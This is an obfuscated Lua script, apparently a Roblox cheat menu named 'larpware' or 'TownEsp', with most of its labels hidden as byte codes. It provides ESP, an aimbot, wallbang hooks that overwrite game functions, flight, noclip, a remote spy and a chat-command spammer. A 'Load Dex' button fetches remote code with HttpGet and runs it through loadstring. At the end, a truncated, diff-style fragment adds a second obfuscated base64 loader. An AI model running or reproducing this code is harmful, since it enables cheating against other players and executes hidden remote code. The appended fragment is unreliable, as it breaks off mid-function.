_ug=_bg(string.char(70,114,97,109,101),{Position=UDim2.fromOffset(0,2),Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,},_ea)_bg(string.char(85,73,76,105,115,116,76,97,121,111,117,116),{Padding=UDim.new(0,4),SortOrder=Enum.SortOrder.LayoutOrder},_ug)_bg(string.char(85,73,80,97,100,100,105,110,103),{PaddingTop=UDim.new(0,4),PaddingBottom=UDim.new(0,6),PaddingLeft=UDim.new(0,6),PaddingRight=UDim.new(0,6)},_ug)_bg(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,Font=_ag,Text=_tg,TextSize=14,TextColor3=_Zf._J,TextXAlignment=Enum.TextXAlignment.Left,},_ug)local _vg={}function _vg.Toggle(_J,_oc,_wg)local _xg=_bg(string.char(84,101,120,116,66,117,116,116,111,110),{Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,Text="",AutoButtonColor=false},_ug)local _ve=_bg(string.char(70,114,97,109,101),{Size=UDim2.fromOffset(12,12),Position=UDim2.fromOffset(0,2),BackgroundColor3=_Zf.back,BorderColor3=_Zf.outline,BorderSizePixel=1,},_xg)_bg(string.char(84,101,120,116,76,97,98,101,108),{Position=UDim2.fromOffset(20,0),Size=UDim2.new(1,-20,1,0),BackgroundTransparency=1,Font=_ag,Text=_J,TextSize=14,TextColor3=_Zf._J,TextXAlignment=Enum.TextXAlignment.Left,},_xg)local function _yg()_ve.BackgroundColor3=_m[_oc]and _Zf.accent or _Zf.back end _xg.MouseButton1Click:Connect(function()_m[_oc]=not _m[_oc]if _wg then _wg(_m[_oc])end _yg()end)_yg()return _yg end function _vg.Slider(_J,_zg,_Ag,_Bg,_Cg,_Dg)local _xg=_bg(string.char(70,114,97,109,101),{Size=UDim2.new(1,0,0,30),BackgroundTransparency=1},_ug)_bg(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,0,0,14),BackgroundTransparency=1,Font=_ag,Text=_J,TextSize=14,TextColor3=_Zf._J,TextXAlignment=Enum.TextXAlignment.Left,},_xg)local _Oe=_bg(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,0,0,14),BackgroundTransparency=1,Font=_ag,Text="",TextSize=14,TextColor3=_Zf.dim,TextXAlignment=Enum.TextXAlignment.Right,},_xg)local _Eg=_bg(string.char(84,101,120,116,66,117,116,116,111,110),{Position=UDim2.fromOffset(0,17),Size=UDim2.new(1,0,0,10),Text="",AutoButtonColor=false,BackgroundColor3=_Zf.back,BorderColor3=_Zf.outline,BorderSizePixel=1,},_xg)local _Fg=_bg(string.char(70,114,97,109,101),{Size=UDim2.new(0,0,1,0),BackgroundColor3=_Zf.accent,BorderSizePixel=0},_Eg)local function _yg()local _db=_Bg()_Fg.Size=UDim2.new(math.clamp((_db-_zg)/(_Ag-_zg),0,1),0,1,0)_Oe.Text=tostring(_db)..(_Dg or"")end local function _Gg(_pc)local _Na=math.clamp((_pc-_Eg.AbsolutePosition.X)/math._Ag(_Eg.AbsoluteSize.X,1),0,1)_Cg(math._eb(_zg+_Na*(_Ag-_zg)+0.5))_yg()end _Eg.InputBegan:Connect(function(_Vb)if _Vb.UserInputType==Enum.UserInputType.MouseButton1 or _Vb.UserInputType==Enum.UserInputType.Touch then _ng=_Gg _Gg(_Vb.Position.X)end end)_yg()end function _vg.Cycle(_J,_Hg,_Bg,_Cg)local _xg=_bg(string.char(70,114,97,109,101),{Size=UDim2.new(1,0,0,38),BackgroundTransparency=1},_ug)_bg(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,0,0,14),BackgroundTransparency=1,Font=_ag,Text=_J,TextSize=14,TextColor3=_Zf._J,TextXAlignment=Enum.TextXAlignment.Left,},_xg)local _ea=_bg(string.char(84,101,120,116,66,117,116,116,111,110),{Position=UDim2.fromOffset(0,16),Size=UDim2.new(1,0,0,20),AutoButtonColor=false,Text="",BackgroundColor3=_Zf.back,BorderColor3=_Zf.outline,BorderSizePixel=1,Font=_ag,TextSize=14,TextColor3=_Zf._J,TextXAlignment=Enum.TextXAlignment.Left,},_xg)_bg(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,-6,1,0),BackgroundTransparency=1,Font=_ag,Text=string.char(118),TextSize=12,TextColor3=_Zf.dim,TextXAlignment=Enum.TextXAlignment.Right,},_ea)local function _yg()_ea.Text=string.char(32,32)..tostring(_Hg[_Bg()])end _ea.MouseButton1Click:Connect(function()_Cg(_Bg()%#_Hg+1);_yg()end)_ea.MouseButton2Click:Connect(function()_Cg((_Bg()-2)%#_Hg+1);_yg()end)_yg()end function _vg.Button(_J,_Ig)local _td=_bg(string.char(84,101,120,116,66,117,116,116,111,110),{Size=UDim2.new(1,0,0,20),AutoButtonColor=false,Text=_J,BackgroundColor3=_Zf.back,BorderColor3=_Zf.outline,BorderSizePixel=1,Font=_ag,TextSize=14,TextColor3=_Zf._J,},_ug)_td.MouseButton1Click:Connect(_Ig)return _td end function _vg.Keybind(_J,_Bg,_Cg)local _xg=_bg(string.char(70,114,97,109,101),{Size=UDim2.new(1,0,0,20),BackgroundTransparency=1},_ug)_bg(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,-70,1,0),BackgroundTransparency=1,Font=_ag,Text=_J,TextSize=14,TextColor3=_Zf._J,TextXAlignment=Enum.TextXAlignment.Left,},_xg)local _ea=_bg(string.char(84,101,120,116,66,117,116,116,111,110),{Position=UDim2.new(1,-64,0,0),Size=UDim2.fromOffset(64,20),AutoButtonColor=false,Text="",BackgroundColor3=_Zf.back,BorderColor3=_Zf.outline,BorderSizePixel=1,Font=_ag,TextSize=13,TextColor3=_Zf._J,},_xg)local function _yg()local _oc=_Bg()_ea.Text=_oc and _oc.Name orstring.char(78,111,110,101)end _ea.MouseButton1Click:Connect(function()_ea.Text=string.char(46,46,46)_og=function(_oc)_Cg(_oc~=Enum.KeyCode.Escape and _oc or nil)_yg()end end)_yg()end function _vg.Input(_Jg,_Kg)local _Vb=_bg(string.char(84,101,120,116,66,111,120),{Size=UDim2.new(1,0,0,20),Text="",PlaceholderText=_Jg,ClearTextOnFocus=false,PlaceholderColor3=Color3.fromRGB(120,120,120),BackgroundColor3=_Zf.back,BorderColor3=_Zf.outline,BorderSizePixel=1,Font=_ag,TextSize=14,TextColor3=_Zf._J,TextXAlignment=Enum.TextXAlignment.Left,},_ug)_Vb.FocusLost:Connect(function(_Lg)if _Lg then _Kg(_Vb.Text)_Vb.Text=""end end)return _Vb end function _vg.TextArea(_Jg,_Mg,_wg,_Ng)local _ea=_bg(string.char(84,101,120,116,66,111,120),{Size=UDim2.new(1,0,0,110),Text=_Mg or"",PlaceholderText=_Jg,ClearTextOnFocus=false,MultiLine=true,TextWrapped=true,PlaceholderColor3=Color3.fromRGB(120,120,120),BackgroundColor3=_Zf.back,BorderColor3=_Zf.outline,BorderSizePixel=1,Font=_ag,TextSize=14,TextColor3=_Zf._J,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,},_ug)_ea:GetPropertyChangedSignal(string.char(84,101,120,116)):Connect(function()if _wg then _wg(_ea.Text)end end)_ea.FocusLost:Connect(function()if _Ng then _Ng(_ea.Text)end end)return _ea end function _vg.Label(_J)return _bg(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Font=_ag,Text=_J,TextSize=12,TextColor3=_Zf.dim,RichText=true,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,},_ug)end function _vg.Container()local _Og=_bg(string.char(70,114,97,109,101),{Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1},_ug)_bg(string.char(85,73,76,105,115,116,76,97,121,111,117,116),{Padding=UDim.new(0,2),SortOrder=Enum.SortOrder.LayoutOrder},_Og)return _Og end return _vg end local _Pg={}local function _Qg(_Rg)for _O,_Hf in ipairs(_Pg)do local _Sg=_Hf==_Rg _Hf.page.Visible=_Sg _Hf._td.BackgroundColor3=_Sg and _Zf.back or _Zf.main _Hf._td.TextColor3=_Sg and _Zf._J or _Zf.dim _Hf.accent.Visible=_Sg end end local function _Tg(_F)local _Rg={}_Rg._td=_bg(string.char(84,101,120,116,66,117,116,116,111,110),{Size=UDim2.fromOffset(#_F*8+24,22),AutoButtonColor=false,Text=_F,LayoutOrder=#_Pg+1,BackgroundColor3=_Zf.main,BorderColor3=_Zf.outline,BorderSizePixel=1,Font=_ag,TextSize=14,TextColor3=_Zf.dim,},_ig)_Rg.accent=_bg(string.char(70,114,97,109,101),{Size=UDim2.new(1,0,0,2),BackgroundColor3=_Zf.accent,BorderSizePixel=0,Visible=false},_Rg._td)_Rg.page=_bg(string.char(70,114,97,109,101),{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Visible=false},_jg)local function _sg(_pc,_Ve)local _Ug=_bg(string.char(83,99,114,111,108,108,105,110,103,70,114,97,109,101),{Position=UDim2.new(_pc,_Ve,0,6),Size=UDim2.new(0.5,-9,1,-12),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=_Zf.accent,CanvasSize=UDim2.new(),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollingDirection=Enum.ScrollingDirection.Y,},_Rg.page)_bg(string.char(85,73,76,105,115,116,76,97,121,111,117,116),{Padding=UDim.new(0,8),SortOrder=Enum.SortOrder.LayoutOrder},_Ug)return _Ug end local _Vg,_Wg=_sg(0,6),_sg(0.5,3)function _Rg._vg(_Xg,_tg)return _rg(_Xg==string.char(108,101,102,116)and _Vg or _Wg,_tg)end _Rg._td.MouseButton1Click:Connect(function()_Qg(_Rg)end)table.insert(_Pg,_Rg)return _Rg end local _Yg={token=0,_J="",delayMs=2500,running=false}do local _Zg=string.char(76,97,114,112,119,97,114,101,76,111,97,100,111,117,116,46,116,120,116)local _ah=game:GetService(string.char(84,101,120,116,67,104,97,116,83,101,114,118,105,99,101))if type(isfile)==string.char(102,117,110,99,116,105,111,110)and type(readfile)==string.char(102,117,110,99,116,105,111,110)then local _I,_J=pcall(function()return isfile(_Zg)and readfile(_Zg)or""end)if _I then _Yg._J=_J end end function _Yg._Uf()if type(writefile)==string.char(102,117,110,99,116,105,111,110)then pcall(writefile,_Zg,_Yg._J)end end local function _bh(_ch)task.spawn(function()local _I=pcall(function()local _dh=_ah:FindFirstChild(string.char(84,101,120,116,67,104,97,110,110,101,108,115))and _ah.TextChannels:FindFirstChild(string.char(82,66,88,71,101,110,101,114,97,108))assert(_dh,string.char(110,111,32,82,66,88,71,101,110,101,114,97,108,32,99,104,97,110,110,101,108))_dh:SendAsync(_ch)end)if _I then return end local _eh=_g:FindFirstChild(string.char(68,101,102,97,117,108,116,67,104,97,116,83,121,115,116,101,109,67,104,97,116,69,118,101,110,116,115))local _fh=_eh and _eh:FindFirstChild(string.char(83,97,121,77,101,115,115,97,103,101,82,101,113,117,101,115,116))if _fh then _fh:FireServer(_ch,string.char(65,108,108))end end)return true end function _Yg.stop()_Yg.token+=1 _Yg.running=false end local _gh=_g:FindFirstChild(string.char(83,101,114,118,101,114,68,105,115,112,108,97,121,77,101,115,115,97,103,101))if _gh then table.insert(_q,_gh.OnClientEvent:Connect(function(_ch)if not _Yg.running then return end local _J=tostring(_ch):gsub(string.char(60,91,94,62,93,43,62),"")print(string.char(91,108,97,114,112,119,97,114,101,93,32,103,97,109,101,32,115,97,121,115,58,32).._J)_mg(string.char(71,97,109,101,58,32)..string.sub(_J,1,70))end))end function _Yg.run(_hh)if _hh and _Yg.running then return end _Yg.token+=1 local _Y=_Yg.token local _ih={}local _jh=(_Yg._J:gsub(string.char(40,37,83,41,37,115,43,40,33,41),string.char(37,49,10,37,50)))for _K in string.gmatch(_jh,string.char(91,94,13,10,93,43))do local _kh=_K:match(string.char(94,37,115,42,40,46,45,41,37,115,42,36))if _kh~=""then table.insert(_ih,_kh)end end if#_ih==0 then _mg(string.char(76,111,97,100,111,117,116,32,105,115,32,101,109,112,116,121))return end _Yg.running=true task.spawn(function()for _Af,_lh in ipairs(_ih)do if _Yg.token~=_Y then return end _mg(string.format(string.char(76,111,97,100,111,117,116,32,37,100,47,37,100,58,32,37,115),_Af,#_ih,_lh))print(string.format(string.char(91,108,97,114,112,119,97,114,101,93,32,108,111,97,100,111,117,116,32,37,100,47,37,100,58,32,37,115),_Af,#_ih,_lh))_bh(_lh)local _mh=os.clock()+_Yg.delayMs/1000 while os.clock()<_mh do if _Yg.token~=_Y then return end task.wait(0.1)end end if _Yg.token==_Y then _Yg.running=false _mg(string.char(76,111,97,100,111,117,116,32,100,111,110,101))end end)end table.insert(_q,_h.CharacterAdded:Connect(function()if not _m.loadoutspawn then return end task.wait(1.5)if _m.loadoutspawn and _h.Character then _Yg.run(true)end end))end local _nh={speed=60,_oc=Enum.KeyCode.G,was=false}local _oh local function _ph(_wc)_m._nh=_wc if not _wc then local _V=_h.Character local _W=_V and _V:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))if _W and _nh.was then _W.AssemblyLinearVelocity=Vector3.zero end _nh.was=false end if _oh then _oh()end end table.insert(_q,_b.Heartbeat:Connect(function()if not _m._nh then return end local _V=_h.Character local _W=_V and _V:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))local _U=_d.CurrentCamera if not _W or not _U then return end _nh.was=true if _m.freecam then _W.AssemblyLinearVelocity=Vector3.zero return end local _tc=Vector3.zero if not _c:GetFocusedTextBox()then local function _nc(_oc)return _c:IsKeyDown(_oc)and 1 or 0 end local _bf,_Wg=_U.CFrame.LookVector,_U.CFrame.RightVector _tc=_bf*(_nc(Enum.KeyCode.W)-_nc(Enum.KeyCode.S))+_Wg*(_nc(Enum.KeyCode.D)-_nc(Enum.KeyCode.A))+Vector3.yAxis*(_nc(Enum.KeyCode.Space)-_nc(Enum.KeyCode.LeftControl))end _W.AssemblyLinearVelocity=_tc.Magnitude>0 and _tc.Unit*_nh.speed or Vector3.zero end))table.insert(_q,_c.InputBegan:Connect(function(_Vb,_Wb)if _Wb or _Vb==_pg or _og then return end if _nh._oc and _Vb.KeyCode==_nh._oc then _ph(not _m._nh)_mg(_m._nh andstring.char(70,108,105,103,104,116,32,111,110)orstring.char(70,108,105,103,104,116,32,111,102,102))end end))local function _qh()_hf.alive=false _Yg.stop()if _m.day and _o then _e.ClockTime=_o end _m.nodark=false _m.nofog=false _m.wallclick=false _m.noclip=false _m.freecam=false _ph(false)_m.aimbot=false _m.spy=false _Oc.running=false _rd()_xd.alive=false if _xd._i then if _xd.rayWrap and _xd._i.RayCast2==_xd.rayWrap then pcall(rawset,_xd._i,string.char(82,97,121,67,97,115,116,50),_xd.rayOrig)end if _xd.fireWrap and _xd._i.fireBullet==_xd.fireWrap then pcall(rawset,_xd._i,string.char(102,105,114,101,66,117,108,108,101,116),_xd.fireOrig)end end _vc(false)pcall(function()_b:UnbindFromRenderStep(string.char(84,111,119,110,69,115,112,70,114,101,101,99,97,109))end)pcall(function()_b:UnbindFromRenderStep(string.char(84,111,119,110,69,115,112,65,105,109))end)_Zb()_ge(nil)_Db:Destroy()_jb()_sb()pcall(function()_b:UnbindFromRenderStep(string.char(84,111,119,110,69,115,112,78,111,68,97,114,107))end)pcall(function()_b:UnbindFromRenderStep(string.char(84,111,119,110,69,115,112,78,111,70,111,103))end)for _O,_zc in ipairs(_q)do _zc:Disconnect()end for _R in pairs(_p)do _Ya(_R)end _ca:Destroy()_fg:Destroy()_i.__TownEspCleanup=nil end _i.__TownEspCleanup=_qh local _rh=_Tg(string.char(69,83,80))do local _sh=_rh._vg(string.char(108,101,102,116),string.char(69,83,80))_sh.Toggle(string.char(69,110,97,98,108,101,100),string.char(101,115,112))_sh.Toggle(string.char(66,111,120),string.char(98,111,120))_sh.Toggle(string.char(83,107,101,108,101,116,111,110),string.char(115,107,101,108,101,116,111,110))_sh.Toggle(string.char(78,97,109,101,115),string.char(110,97,109,101,115))_sh.Toggle(string.char(84,114,97,99,101,114,115),string.char(116,114,97,99,101,114,115))_sh.Toggle(string.char(72,101,97,108,116,104,32,66,97,114),string.char(104,101,97,108,116,104))_sh.Toggle(string.char(86,105,115,105,98,108,101,32,67,111,108,111,117,114),string.char(118,105,115,99,111,108,111,114))_sh.Toggle(string.char(83,65,70,69,32,47,32,85,78,83,65,70,69),string.char(115,97,102,101))local _th=_rh._vg(string.char(114,105,103,104,116),string.char(87,97,116,99,104,108,105,115,116))_th.Toggle(string.char(72,105,103,104,108,105,103,104,116,32,87,97,116,99,104,101,100),string.char(119,97,116,99,104,108,105,115,116))local _uh local _vh={}local function _wh()for _O,_xg in ipairs(_vh)do _xg:Destroy()end _vh={}local _E={}for _F in pairs(_C)do table.insert(_E,_F)end table.sort(_E)for _O,_F in ipairs(_E)do local _xg=_bg(string.char(84,101,120,116,66,117,116,116,111,110),{Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,AutoButtonColor=false,Text=string.char(91,45,93,32).._F,Font=_ag,TextSize=14,TextColor3=Color3.fromRGB(255,90,90),TextXAlignment=Enum.TextXAlignment.Left,},_uh)_xg.MouseButton1Click:Connect(function()_C[_F]=nil _D()_wh()end)_vh[#_vh+1]=_xg end end _th.Input(string.char(117,115,101,114,110,97,109,101,32,43,32,69,110,116,101,114),function(_J)_L(_J)_wh()end)_uh=_th.Container()_wh()end local _xh=_Tg(string.char(65,105,109,98,111,116))do local _sh=_xh._vg(string.char(108,101,102,116),string.char(65,105,109,98,111,116))_sh.Toggle(string.char(69,110,97,98,108,101,100),string.char(97,105,109,98,111,116),function(_wc)if not _wc then _Oc.running=false _rd()end end)_sh.Toggle(string.char(84,111,103,103,108,101,32,77,111,100,101),string.char(97,105,109,116,111,103,103,108,101),function()_Oc.running=false _rd()end)_sh.Cycle(string.char(76,111,99,107,32,80,97,114,116),_Ac,function()return _Cc end,function(_ma)_Cc=_ma;_rd()end)_sh.Cycle(string.char(76,111,99,107,32,77,111,100,101),_Bc,function()return _Dc end,function(_ma)_Dc=_ma;_rd()end)_sh.Slider(string.char(70,79,86),30,600,function()return _Gc end,function(_Ce)_Gc=_Ce end)_sh.Slider(string.char(83,109,111,111,116,104,105,110,103),0,95,function()return _Hc end,function(_Ce)_Hc=_Ce end,string.char(37))_sh.Toggle(string.char(83,104,111,119,32,70,79,86),string.char(97,105,109,99,105,114,99,108,101))_sh.Toggle(string.char(80,114,101,100,105,99,116,32,77,111,118,101,109,101,110,116),string.char(97,105,109,111,102,102,115,101,116))_sh.Slider(string.char(80,114,101,100,105,99,116,105,111,110),1,30,function()return _Ic end,function(_Ce)_Ic=_Ce end)local _yh=_xh._vg(string.char(108,101,102,116),string.char(84,114,97,99,101,114))_yh.Toggle(string.char(67,108,111,115,101,115,116,32,80,108,97,121,101,114,32,84,114,97,99,101,114),string.char(97,105,109,116,114,97,99,101,114))_yh.Cycle(string.char(84,114,97,99,101,114,32,70,114,111,109),_Sc,function()return _Tc end,function(_ma)_Tc=_ma end)local _re=_xh._vg(string.char(114,105,103,104,116),string.char(67,104,101,99,107,115))_re.Toggle(string.char(87,97,108,108,32,67,104,101,99,107),string.char(97,105,109,119,97,108,108))_re.Toggle(string.char(83,65,70,69,32,67,104,101,99,107),string.char(97,105,109,115,97,102,101))_re.Toggle(string.char(84,101,97,109,32,67,104,101,99,107),string.char(97,105,109,116,101,97,109))_re.Toggle(string.char(71,117,110,32,79,110,108,121),string.char(97,105,109,103,117,110))local _zh=_xh._vg(string.char(114,105,103,104,116),string.char(78,101,118,101,114,32,65,105,109,32,65,116))local _Ah local _Bh={}local function _Ch()for _O,_xg in ipairs(_Bh)do _xg:Destroy()end _Bh={}local _E={}for _F in pairs(_Xc)do table.insert(_E,_F)end table.sort(_E)for _O,_F in ipairs(_E)do local _xg=_bg(string.char(84,101,120,116,66,117,116,116,111,110),{Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,AutoButtonColor=false,Text=string.char(91,45,93,32).._F,Font=_ag,TextSize=14,TextColor3=Color3.fromRGB(255,200,90),TextXAlignment=Enum.TextXAlignment.Left,},_Ah)_xg.MouseButton1Click:Connect(function()_Xc[_F]=nil _Yc()_Ch()end)_Bh[#_Bh+1]=_xg end end _zh.Label(string.char(76,105,115,116,101,100,32,112,108,97,121,101,114,115,32,97,114,101,32,115,107,105,112,112,101,100,32,98,121,32,116,104,101,32,97,105,109,98,111,116,32,97,110,100,32,116,114,97,99,101,114,46,32,67,108,105,99,107,32,97,32,114,111,119,32,116,111,32,114,101,109,111,118,101,32,105,116,46))_zh.Input(string.char(117,115,101,114,110,97,109,101,32,43,32,69,110,116,101,114),function(_J)_ad(_J)_rd()_Ch()end)_Ah=_zh.Container()_Ch()local _Dh=_xh._vg(string.char(114,105,103,104,116),string.char(83,116,97,116,117,115))_Jc=_Dh.Label("")end local _Eh=_Tg(string.char(76,111,97,100,111,117,116))do local _sh=_Eh._vg(string.char(108,101,102,116),string.char(76,111,97,100,111,117,116))_sh.Label(string.char(79,110,101,32,99,104,97,116,32,99,111,109,109,97,110,100,32,112,101,114,32,108,105,110,101,44,32,115,101,110,116,32,105,110,32,111,114,100,101,114,46))_sh.TextArea(string.char(33,115,112,97,119,110,32,46,46,46,10,33,115,112,97,119,110,97,114,109,111,114,32,46,46,46,10,33,115,112,97,119,110,109,97,103,115,32,46,46,46),_Yg._J,function(_J)_Yg._J=_J end,function()_Yg._Uf()end)_sh.Button(string.char(82,117,110,32,76,111,97,100,111,117,116),function()_Yg.run()end)_sh.Button(string.char(83,116,111,112),function()_Yg.stop()_mg(string.char(76,111,97,100,111,117,116,32,115,116,111,112,112,101,100))end)_sh.Toggle(string.char(82,117,110,32,79,110,32,82,101,115,112,97,119,110),string.char(108,111,97,100,111,117,116,115,112,97,119,110))_sh.Slider(string.char(68,101,108,97,121,32,66,101,116,119,101,101,110,32,67,111,109,109,97,110,100,115),250,10000,function()return _Yg.delayMs end,function(_Ce)_Yg.delayMs=_Ce end,string.char(109,115))local _wf=_Eh._vg(string.char(114,105,103,104,116),string.char(67,111,109,109,97,110,100,115,32,73,110,32,84,104,105,115,32,80,108,97,99,101))_wf.Label(string.char(70,114,111,109,32,116,104,101,32,103,97,109,101,39,115,32,99,104,97,116,32,99,111,109,109,97,110,100,115,32,40,97,108,105,97,115,32,105,110,32,98,114,97,99,107,101,116,115,41,58,10)..string.char(33,115,112,97,119,110,32,91,33,115,93,10,33,115,112,97,119,110,97,114,109,111,114,32,91,33,115,97,93,10,33,115,112,97,119,110,109,97,103,115,32,91,33,115,109,93,10,33,115,112,97,119,110,116,111,111,108,115,32,91,33,115,116,93,10)..string.char(33,115,101,116,97,114,109,111,114,32,91,33,115,116,97,93,10,33,114,101,102,105,108,108,32,91,33,114,102,93,10,33,104,101,97,108,32,91,33,104,93,10,33,109,115,112,97,119,110,32,91,33,109,115,93,10,33,100,115,112,97,119,110,32,91,33,100,115,93,10)..string.char(84,121,112,101,32,33,99,109,100,115,32,105,110,32,103,97,109,101,32,102,111,114,32,116,104,101,32,102,117,108,108,32,108,105,115,116,32,97,110,100,32,119,104,97,116,32,101,97,99,104,32,111,110,101,32,116,97,107,101,115,46,32)..string.char(80,117,116,32,116,104,101,32,101,120,97,99,116,32,116,101,120,116,32,121,111,117,39,100,32,110,111,114,109,97,108,108,121,32,116,121,112,101,32,111,110,32,101,97,99,104,32,108,105,110,101,46))end local _Fh=_Tg(string.char(87,97,108,108,98,97,110,103))do local _sh=_Fh._vg(string.char(108,101,102,116),string.char(87,97,108,108,98,97,110,103))_sh.Toggle(string.char(69,110,97,98,108,101,100),string.char(119,97,108,108,98,97,110,103))_sh.Cycle(string.char(77,101,116,104,111,100),_Ec,function()return _Fc end,function(_ma)_Fc=_ma end)_Kc=_sh.Label("")end local _Gh=_Tg(string.char(87,111,114,108,100))do local _Hh=_Gh._vg(string.char(108,101,102,116),string.char(76,105,103,104,116,105,110,103))_Hh.Toggle(string.char(65,108,119,97,121,115,32,68,97,121),string.char(100,97,121),function(_wc)if _wc then _o=_e.ClockTime elseif _o then _e.ClockTime=_o _o=nil end end)_Hh.Toggle(string.char(78,111,32,68,97,114,107),string.char(110,111,100,97,114,107),function(_wc)if _wc then _bb={_hb=_e.Ambient,_ib=_e.OutdoorAmbient,exposure=_e.ExposureCompensation,}_fb()else _jb()end end)_Hh.Toggle(string.char(78,111,32,70,111,103),string.char(110,111,102,111,103),function(_wc)if _wc then _mb={fogStart=_e.FogStart,fogEnd=_e.FogEnd}_ob={}for _qb in pairs(_nb)do _pb(_qb)end _rb()else _sb()end end)local _Ih={}for _ma,_gb in ipairs(_Za)do _Ih[_ma]=_gb._F end _Hh.Cycle(string.char(78,111,32,68,97,114,107,32,76,101,118,101,108),_Ih,function()return _ab end,function(_ma)_ab=_ma _fb()end)local _Jh=_Gh._vg(string.char(108,101,102,116),string.char(75,105,108,108,32,70,101,101,100))_Jh.Toggle(string.char(75,105,108,108,32,70,101,101,100),string.char(107,105,108,108,108,111,103),function(_wc)if not _wc then _hf.clear()end end)local _Kh=_Gh._vg(string.char(108,101,102,116),string.char(67,97,109,101,114,97))_jc=_Kh.Toggle(string.char(70,114,101,101,99,97,109),string.char(102,114,101,101,99,97,109),function(_wc)_vc(_wc)end)local _Lh=_Gh._vg(string.char(114,105,103,104,116),string.char(87,97,108,108,115))_Lh.Toggle(string.char(87,97,108,108,32,67,108,105,99,107),string.char(119,97,108,108,99,108,105,99,107),function(_wc)if _wc and type(fireclickdetector)~=string.char(102,117,110,99,116,105,111,110)then _m.wallclick=false _mg(string.char(102,105,114,101,99,108,105,99,107,100,101,116,101,99,116,111,114,32,105,115,32,109,105,115,115,105,110,103))end end)_Lh.Toggle(string.char(87,97,108,108,32,78,111,99,108,105,112),string.char(110,111,99,108,105,112))_Lh.Button(string.char(82,101,115,101,116,32,87,97,108,108,115),_Zb)end local _Mh=_Tg(string.char(77,105,115,99))do local _Nh=_Mh._vg(string.char(108,101,102,116),string.char(84,111,111,108,115))_Nh.Toggle(string.char(82,101,109,111,116,101,32,83,112,121),string.char(115,112,121))local _Oh=_Nh.Label(string.char(76,111,103,103,101,100,58,32,48))_Lc=function()_Oh.Text=string.char(76,111,103,103,101,100,58,32).._Ae end _Nh.Button(string.char(68,117,109,112,32,71,117,110),function()local _I,_wf=_Je()_mg(_I and(string.char(68,117,109,112,101,100,32).._wf)or _wf)end)local _Ph,_Qh=false,false _Nh.Button(string.char(76,111,97,100,32,68,101,120),function()if _Ph or _Qh then return end if type(loadstring)~=string.char(102,117,110,99,116,105,111,110)then _mg(string.char(108,111,97,100,115,116,114,105,110,103,32,105,115,32,109,105,115,115,105,110,103))return end _Qh=true _mg(string.char(76,111,97,100,105,110,103,32,68,101,120,46,46,46))task.spawn(function()local _I,_Se=pcall(function()loadstring(game:HttpGet(_k))()end)_Qh=false if _I then _Ph=true _mg(string.char(68,101,120,32,108,111,97,100,101,100))else warn(string.char(91,108,97,114,112,119,97,114,101,93,32,68,101,120,32,102,97,105,108,101,100,32,116,111,32,108,111,97,100,58,32)..tostring(_Se))_mg(string.char(68,101,120,32,102,97,105,108,101,100,32,116,111,32,108,111,97,100))end end)end)local _Rh=_Mh._vg(string.char(108,101,102,116),string.char(70,108,105,103,104,116))_oh=_Rh.Toggle(string.char(70,108,105,103,104,116),string.char(102,108,121),_ph)_Rh.Keybind(string.char(84,111,103,103,108,101,32,75,101,121),function()return _nh._oc end,function(_oc)_nh._oc=_oc end)_Rh.Slider(string.char(83,112,101,101,100),10,250,function()return _nh.speed end,function(_Ce)_nh.speed=_Ce end)_Rh.Label(string.char(87,65,83,68,32,109,111,118,101,115,32,97,108,111,110,103,32,116,104,101,32,99,97,109,101,114,97,44,32,83,112,97,99,101,32,117,112,44,32,76,101,102,116,67,116,114,108,32,100,111,119,110,46))local _Sh=_Mh._vg(string.char(114,105,103,104,116),string.char(69,120,101,99,117,116,111,114))local _Th=_Sh.Label("")_Sh.Button(string.char(67,104,101,99,107,32,69,120,101,99,117,116,111,114),function()_Th.Text=_qe()end)local _Uh=_Mh._vg(string.char(114,105,103,104,116),string.char(77,101,110,117))_Uh.Button(string.char(85,110,108,111,97,100),_qh)end _Qg(_Pg[1])local _Vh,_Wh,_Xh _hg.InputBegan:Connect(function(_Vb)if _Vb.UserInputType==Enum.UserInputType.MouseButton1 or _Vb.UserInputType==Enum.UserInputType.Touch then _Vh,_Wh,_Xh=true,_Vb.Position,_gg.Position end end)table.insert(_q,_c.InputChanged:Connect(function(_Vb)if _Vh and(_Vb.UserInputType==Enum.UserInputType.MouseMovement or _Vb.UserInputType==Enum.UserInputType.Touch)then local _wa=_Vb.Position-_Wh _gg.Position=UDim2.new(_Xh.X.Scale,_Xh.X.Offset+_wa.X,_Xh.Y.Scale,_Xh.Y.Offset+_wa.Y)end end))table.insert(_q,_c.InputEnded:Connect(function(_Vb)if _Vb.UserInputType==Enum.UserInputType.MouseButton1 or _Vb.UserInputType==Enum.UserInputType.Touch then _Vh=false end end))table.insert(_q,_c.InputBegan:Connect(function(_Vb,_Wb)if _Wb then return end if _Vb.KeyCode==_j then _gg.Visible=not _gg.Visible end end))
+return(function(R1Lfb, ...)
+local ME1x8k = {"1lZ";"kWDfcbuGIT";"tcz0";"7l7Uxjej8";"7ZOR5h3kgYQ";"SrYMaAfnR";"77jE";"cDS";"0VBodOz1vJtmQ";"OdueJB4ki";"GLasBYPjAlitJc"}
+local CBe0LQhO = function(...)
+local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
